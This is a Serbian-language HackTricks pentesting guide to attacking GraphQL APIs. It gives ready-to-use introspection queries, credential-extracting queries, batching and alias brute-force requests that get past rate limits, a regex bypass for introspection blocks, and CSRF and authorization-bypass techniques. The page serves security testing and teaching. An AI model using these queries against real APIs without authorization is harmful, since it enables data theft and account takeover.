# GraphQL

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

GraphQL je **istican** kao **efikasna alternativa** REST API-ju, nudeći pojednostavljen pristup za upitivanje podataka sa backend-a. Za razliku od REST-a, koji često zahteva brojne zahteve preko različitih endpoint-a za prikupljanje podataka, GraphQL omogućava dobijanje svih potrebnih informacija putem **jednog zahteva**. Ovo pojednostavljenje značajno **koristi developerima** smanjujući složenost njihovih procesa dobijanja podataka.

## GraphQL i Bezbednost

Sa pojavom novih tehnologija, uključujući GraphQL, pojavljuju se i nove bezbednosne ranjivosti. Ključna stvar koju treba imati na umu je da **GraphQL ne uključuje mehanizme autentifikacije po default-u**. Odgovornost je programera da implementiraju takve bezbednosne mere. Bez odgovarajuće autentifikacije, GraphQL endpoint-i mogu otkriti osetljive informacije neautentifikovanim korisnicima, predstavljajući značajan bezbednosni rizik.

### Napadi Brute Force na Direktorijume i GraphQL

Za identifikaciju izloženih GraphQL instanci, preporučuje se uključivanje određenih putanja u napade brute force na direktorijume. Ove putanje su:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identifikacija otvorenih GraphQL instanci omogućava pregled podržanih upita. To je ključno za razumevanje podataka dostupnih putem endpoint-a. GraphQL-ov sistem introspekcije olakšava ovo detaljisanjem upita koje šema podržava. Za više informacija o ovome, pogledajte GraphQL dokumentaciju o introspekciji: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Alat [**graphw00f**](https://github.com/dolevf/graphw00f) je sposoban da otkrije koji GraphQL engine se koristi na serveru i zatim prikaže neke korisne informacije za bezbednosnog revizora.

#### Univerzalni upiti <a href="#universal-queries" id="universal-queries"></a>

Da biste proverili da li je URL GraphQL servis, može se poslati **univerzalni upit**, `query{__typename}`. Ako odgovor sadrži `{"data": {"__typename": "Query"}}`, potvrđuje da URL hostuje GraphQL endpoint. Ovaj metod se oslanja na GraphQL-ovo polje `__typename`, koje otkriva tip upitanog objekta.

```javascript
query{__typename}
```

### Osnovna enumeracija

GraphQL obično podržava **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Iako je radi bezbednosti preporučljivo dozvoliti samo json kako bi se sprečili CSRF napadi.

#### Introspekcija

Da biste koristili introspekciju za otkrivanje informacija o šemi, upitajte polje `__schema`. Ovo polje je dostupno na korenskom tipu svih upita.

```bash
query={__schema{types{name,fields{name}}}}
```

Sa ovim upitom pronaći ćete ime svih tipova koji se koriste:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Sa ovim upitom možete izvući sve tipove, njihova polja i argumente (i tip argumenata). Ovo će biti vrlo korisno da biste znali kako upitati bazu podataka.

![](<../../.gitbook/assets/image (207) (3).png>)

**Greške**

Interesantno je znati da li će **greške** biti **prikazane** jer će doprineti korisnim **informacijama**.

```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

**Enumeracija šeme baze podataka putem introspekcije**

{% hint style="info" %}
Ako je omogućena introspekcija, ali prethodni upit ne funkcioniše, pokušajte ukloniti direktive `onOperation`, `onFragment` i `onField` iz strukture upita.
{% endhint %}

```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```

Inline inspekcijski upit:

```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```

Poslednja linija koda je graphql upit koji će izbaciti sve metainformacije iz graphql-a (imena objekata, parametri, tipovi...)

![](<../../.gitbook/assets/image (206).png>)

Ako je omogućena introspekcija, možete koristiti [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) da biste videli u GUI-u sve opcije.

### Upitovanje

Sada kada znamo kakve informacije su sačuvane u bazi podataka, pokušajmo **izvući neke vrednosti**.

U introspekciji možete pronaći **koji objekat možete direktno upitati** (jer ne možete upitati objekat samo zato što postoji). Na sledećoj slici možete videti da se "_queryType_" zove "_Query_" i da je jedno od polja objekta "_Query_" "_flags_", koji je takođe tip objekta. Stoga možete upitati objekat zastave.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Imajte na umu da je tip upita "_flags_" "_Flags_", a ovaj objekat je definisan na sledeći način:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Možete videti da su objekti "_Flags_" sastavljeni od **imena** i **vrednosti**. Zatim možete dobiti sva imena i vrednosti zastava upitom:

```javascript
query={flags{name, value}}
```

Imajte na umu da u slučaju da je **objekat za upit** **primitivan** **tip** poput **stringa** kao u sledećem primeru

![](<../../.gitbook/assets/image (441).png>)

Možete ga jednostavno upitati sa:

```javascript
query={hiddenFlags}
```

U još jednom primeru gde su postojala 2 objekta unutar "_Query_" tipa objekta: "_user_" i "_users_".\
Ako ovi objekti ne zahtevaju nikakav argument za pretragu, mogli biste **dobiti sve informacije iz njih** samo **tražeći** podatke koje želite. U ovom primeru sa interneta mogli biste izvući sačuvane korisničke imena i lozinke:

![](<../../.gitbook/assets/image (208).png>)

Međutim, u ovom primeru, ako pokušate to da uradite, dobićete ovu **grešku**:

![](<../../.gitbook/assets/image (210).png>)

Izgleda da će pretraga koristiti "_**uid**_" argument tipa _**Int**_.\
U svakom slučaju, već smo znali da je u odeljku [Osnovna enumeracija](graphql.md#basic-enumeration) predložen upit koji nam je pokazivao sve potrebne informacije: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Ako pročitate priloženu sliku kada pokrenete taj upit, videćete da je "_**user**_" imao **arg** "_**uid**_" tipa _Int_.

Dakle, vršeći neki lagani _**uid**_ brute force, otkrio sam da je sa _**uid**=**1**_ dobijeno korisničko ime i lozinka:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Imajte na umu da sam **otkrio** da mogu tražiti **parametre** "_**user**_" i "_**password**_" jer ako pokušam da pronađem nešto što ne postoji (`query={user(uid:1){noExists}}`) dobijam ovu grešku:

![](<../../.gitbook/assets/image (213).png>)

I tokom faze **enumeracije** otkrio sam da je objekat "_**dbuser**_" imao polja "_**user**_" i "_**password**_.

**Triks sa ispuštanjem upita u obliku niske (hvala @BinaryShadow\_)**

Ako možete pretraživati po tipu niske, kao: `query={theusers(description: ""){username,password}}` i **tražite praznu nisku**, ispuštaće **sve podatke**. (_Napomena: ovaj primer nije povezan sa primerom iz tutorijala, za ovaj primer pretpostavite da možete pretraživati koristeći "**theusers**" po polju tipa String nazvanom "**description**"_).

### Pretraga

U ovom okruženju, **baza podataka** sadrži **osobe** i **filmove**. **Osobe** su identifikovane svojim **emailom** i **imenom**; **filmovi** po njihovom **imenom** i **ocenom**. **Osobe** mogu biti prijatelji jedni sa drugima i takođe imati filmove, što ukazuje na odnose unutar baze podataka.

Možete **pretraživati** osobe **po** imenu i dobiti njihove emaile:

```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```

Možete **pretraživati** osobe **po** imenu i dobiti njihove **pretplaćene** **filmove**:

```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```

Obratite pažnju kako je naznačeno da se dobije `name` od `subscribedMovies` osobe.

Takođe možete **pretraživati više objekata istovremeno**. U ovom slučaju, pretražuju se 2 filma:

```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```

Ili čak **odnosi nekoliko različitih objekata korišćenjem aliasa**:

```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```

### Mutacije

**Mutacije se koriste za pravljenje promena na serverskoj strani.**

U **introspekciji** možete pronaći **deklarisane** **mutacije**. Na sledećoj slici "_MutationType_" se naziva "_Mutation_" i objekat "_Mutation_" sadrži imena mutacija (kao što je "_addPerson_" u ovom slučaju):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

U ovom postavci, **baza podataka** sadrži **osobe** i **filmove**. **Osobe** su identifikovane njihovim **emailom** i **imenom**; **filmovi** po njihovom **imenom** i **ocenom**. **Osobe** mogu biti prijatelji jedni sa drugima i takođe imati filmove, što ukazuje na odnose unutar baze podataka.

Mutacija za **kreiranje novih** filmova unutar baze podataka može izgledati ovako (u ovom primeru mutacija se zove `addMovie`):

```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```

**Obratite pažnju kako su i vrednosti i tipovi podataka naznačeni u upitu.**

Dodatno, baza podataka podržava operaciju **mutacije**, nazvanu `addPerson`, koja omogućava kreiranje **osoba** zajedno sa njihovim povezivanjem sa postojećim **prijateljima** i **filmovima**. Važno je napomenuti da prijatelji i filmovi moraju već postojati u bazi podataka pre nego što budu povezani sa novostvorenom osobom.

```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```

### Preopterećenje direktive

Kao što je objašnjeno u [**jednoj od ranjivosti opisanih u ovom izveštaju**](https://www.landh.tech/blog/20240304-google-hack-50000/), preopterećenje direktive podrazumeva poziv direktive čak i milione puta kako bi server potrošio operacije dok nije moguće izvršiti DoS napad.

### Grubo silovanje u 1 API zahtevu

Ove informacije su preuzete sa [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentifikacija putem GraphQL API-a sa **istovremenim slanjem mnogo upita sa različitim akreditacijama** kako bi se proverilo. To je klasičan napad grubom silom, ali sada je moguće poslati više od jednog para korisničko ime/lozinka po HTTP zahtevu zbog mogućnosti grupisanja u GraphQL-u. Ovaj pristup bi prevario spoljne aplikacije za praćenje stope da misle da je sve u redu i da nema bota koji pokušava da pogodi lozinke.

Ispod možete pronaći najjednostavniju demonstraciju zahteva za autentifikaciju aplikacije, sa **3 različita para email/lozinka istovremeno**. Očigledno je moguće poslati hiljade u jednom zahtevu na isti način:

![](<../../.gitbook/assets/image (182) (1).png>)

Kao što možemo videti sa snimka odgovora, prvi i treći zahtevi vratili su _null_ i odražavali odgovarajuće informacije u odeljku _error_. **Druga mutacija je imala tačne autentifikacione** podatke i odgovor je imao tačan autentifikacioni sesijski token.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Bez introspekcije

Sve više **graphql endpointa onemogućava introspekciju**. Međutim, greške koje graphql baca kada primi neočekivan zahtev su dovoljne za alate poput [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) da rekonstruišu veći deo šeme.

Osim toga, Burp Suite ekstenzija [**GraphQuail**](https://github.com/forcesunseen/graphquail) **prati GraphQL API zahteve koji prolaze kroz Burp** i **gradi** internu GraphQL **šemu** sa svakim novim upitom koji vidi. Takođe može izložiti šemu za GraphiQL i Voyager. Ekstenzija vraća lažni odgovor kada primi introspekcijski upit. Kao rezultat, GraphQuail prikazuje sve upite, argumente i polja dostupna za korišćenje unutar API-ja. Za više informacija [**proverite ovo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Lep **wordlist** za otkrivanje [**GraphQL entiteta može se pronaći ovde**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Zaobilaženje odbrana introspekcije GraphQL-a <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Zaobilaženje Odbrana Introspekcije GraphQL-a**

Da bi se zaobišle restrikcije na introspekcijske upite u API-ima, ubacivanje **specijalnog karaktera posle ključne reči `__schema`** pokazuje se efikasnim. Ovaj metod iskorišćava uobičajene propuste programera u regex obrascima koji ciljaju blokiranje introspekcije fokusiranjem na ključnu reč `__schema`. Dodavanjem karaktera poput **razmaka, novih linija i zareza**, koje GraphQL ignoriše ali možda nisu uzete u obzir u regex-u, restrikcije mogu biti zaobiđene. Na primer, introspekcijski upit sa novom linijom posle `__schema` može zaobići takve odbrane:

```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```

Ako ne uspete, razmotrite alternativne metode zahteva, poput **GET zahteva** ili **POST sa `x-www-form-urlencoded`**, jer se ograničenja mogu odnositi samo na POST zahteve.

### **Otkrivanje izloženih GraphQL struktura**

Kada je introspekcija onemogućena, ispitivanje izvornog koda veb sajta radi unapred učitanih upita u JavaScript bibliotekama je korisna strategija. Ovi upiti mogu se pronaći koristeći karticu `Sources` u alatima za razvoj, pružajući uvide u šemu API-ja i otkrivajući potencijalno **izložene osetljive upite**. Komande za pretragu unutar alata za razvoj su:

```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```

## CSRF u GraphQL-u

Ako ne znate šta je CSRF, pročitajte sledeću stranicu:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Možete pronaći nekoliko GraphQL endpointa **konfigurisanih bez CSRF tokena.**

Imajte na umu da se GraphQL zahtevi obično šalju putem POST zahteva koristeći Content-Type **`application/json`**.

```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```

Međutim, većina GraphQL krajnjih tačaka takođe podržava **`form-urlencoded` POST zahteve:**

```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```

Dakle, budući da se CSRF zahtevi poput prethodnih šalju **bez prethodnih zahteva**, moguće je **izvršiti** **promene** u GraphQL-u zloupotrebom CSRF-a.

Međutim, imajte na umu da je nova podrazumevana vrednost kolačića za `samesite` zastavicu u Chrome-u `Lax`. To znači da će kolačić biti poslat samo sa veb stranice treće strane u GET zahtevima.

Imajte na umu da je obično moguće poslati **upit** **zahtev** takođe kao **GET** **zahtev i CSRF token možda neće biti validiran u GET zahtevu.**

Takođe, zloupotrebom [**XS-Search**](../../pentesting-web/xs-search/) **napada** moguće je eksfiltrirati sadržaj sa GraphQL endpointa zloupotrebom korisničkih podataka.

Za više informacija **proverite** [**originalni post ovde**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizacija u GraphQL-u

Mnoge GraphQL funkcije definisane na endpointu mogu proveravati samo autentifikaciju zahtevaoca, ali ne i autorizaciju.

Izmena ulaznih promenljivih upita može dovesti do **procurivanja** osetljivih detalja naloga [leaked](https://hackerone.com/reports/792927).

Mutacija čak može dovesti do preuzimanja naloga pokušavajući da se izmene podaci drugog naloga.

```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```

### Bypass autorizacije u GraphQL-u

[Povezivanje upita](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) može zaobići slab sistem autentikacije.

U donjem primeru možete videti da je operacija "forgotPassword" i da bi trebalo da izvrši samo upit forgotPassword koji je s njim povezan. Ovo se može zaobići dodavanjem upita na kraju, u ovom slučaju dodajemo "register" i korisničku promenljivu da bi sistem registrovao novog korisnika.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Zaobilaženje ograničenja brzine korišćenjem aliasa u GraphQL-u

U GraphQL-u, aliasi su moćna funkcija koja omogućava **eksplicitno imenovanje svojstava** prilikom slanja zahteva API-ju. Ova mogućnost je posebno korisna za dobijanje **više instanci istog tipa** objekta u jednom zahtevu. Aliasima se može prevazići ograničenje koje sprečava GraphQL objekte da imaju više svojstava sa istim imenom.

Za detaljno razumevanje GraphQL aliasa, preporučuje se sledeći resurs: [Alias](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Iako je primarni cilj aliasa smanjenje potrebe za brojnim API pozivima, identifikovan je neplanirani slučaj upotrebe gde se aliasi mogu iskoristiti za izvođenje napada grubom silom na GraphQL endpoint. Ovo je moguće jer su neki endpointovi zaštićeni limitatorima brzine dizajniranim da spreče napade grubom silom ograničavanjem **broja HTTP zahteva**. Međutim, ovi limitatori brzine možda ne uzimaju u obzir broj operacija unutar svakog zahteva. S obzirom da aliasi omogućavaju uključivanje više upita u jedan HTTP zahtev, mogu zaobići takve mere ograničenja brzine.

Razmotrite donji primer, koji ilustruje kako se aliasovani upiti mogu koristiti za proveru validnosti kodova popusta u prodavnici. Ovaj metod bi mogao zaobići ograničenje brzine jer kompajlira nekoliko upita u jedan HTTP zahtev, što potencijalno omogućava proveru brojnih kodova popusta istovremeno.

```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```

## Alati

### Skeneri ranjivosti

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit koji se može koristiti za dobijanje šema i pretragu osetljivih podataka, testiranje autorizacije, grubo pretraživanje šema i pronalaženje putanja do određenog tipa.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Može se koristiti samostalno ili kao [Burp ekstenzija](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Može se koristiti kao CLI klijent takođe za automatizaciju napada.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Alat koji nabraja različite načine dostizanja određenog tipa u GraphQL šemi.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp ekstenzija za napredno testiranje GraphQL-a. _**Scanner**_ je srž InQL v5.0, gde možete analizirati GraphQL endpoint ili lokalni introspekcijski fajl šeme. Automatski generiše sve moguće upite i mutacije, organizujući ih u strukturiran prikaz za vašu analizu. Komponenta _**Attacker**_ vam omogućava pokretanje grupnih GraphQL napada, što može biti korisno za zaobilazak loše implementiranih ograničenja brzine.

### Klijenti

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI klijent
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI klijent

### Automatski testovi

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video koji objašnjava AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Reference

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
